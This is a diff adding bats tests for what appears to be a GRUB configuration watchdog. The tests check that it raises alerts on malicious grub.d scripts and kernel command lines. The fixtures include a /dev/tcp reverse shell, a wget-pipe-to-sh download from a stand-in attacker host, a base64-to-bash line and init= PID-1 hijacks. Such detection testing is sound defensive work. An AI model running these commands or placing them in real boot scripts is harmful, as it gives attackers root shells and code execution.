@@ -133,3 +133,71 @@ seed_benign() {
     [ "${status}" -ne 0 ]
     cap | grep -q '"severity":"alert"'
 }
+
+@test "baseline is chmod 0600 (confidentiality — grub.d inventory enumerates root-exec-at-update-grub surface)" {
+    seed_benign
+    run_wd
+    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
+}
+
+@test "INVARIANT (reverse-shell pattern in grub.d script): /dev/tcp reverse shell → alert" {
+    seed_benign
+    run_wd
+    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${SCRIPT}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (wget-pipe-sh in grub.d script): wget bootstrap → alert" {
+    seed_benign
+    run_wd
+    printf '#!/bin/sh\nwget -qO- http://attacker/p | sh\n' > "${SCRIPT}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (base64-decode-pipe in grub.d script): obfuscation → alert" {
+    seed_benign
+    run_wd
+    printf '#!/bin/sh\necho YmFzaCAtaQ== | base64 -d | bash\n' > "${SCRIPT}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (init= under /var/tmp also fires PID-1 hijack): writable-root expansion" {
+    seed_benign
+    run_wd
+    printf 'GRUB_TIMEOUT=5\nGRUB_CMDLINE_LINUX="quiet splash init=/var/tmp/.attacker-init"\n' > "${DEFAULT}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (group-writable grub.d script): group-writable → alert above world-writable bar" {
+    seed_benign
+    run_wd
+    chmod 0664 "${SCRIPT}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
+
+@test "INVARIANT (init= ANYWHERE in cmdline — not just at end): mid-cmdline init= still triggers" {
+    seed_benign
+    run_wd
+    # init= at the START of cmdline, not the end.
+    printf 'GRUB_TIMEOUT=5\nGRUB_CMDLINE_LINUX="init=/tmp/.attacker quiet splash"\n' > "${DEFAULT}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
+    seed_benign
+    run_wd
+    main_count=$(cap | grep -cE '^-t selfdef-grub-config -- ')
+    [ "${main_count}" = "1" ]
+}
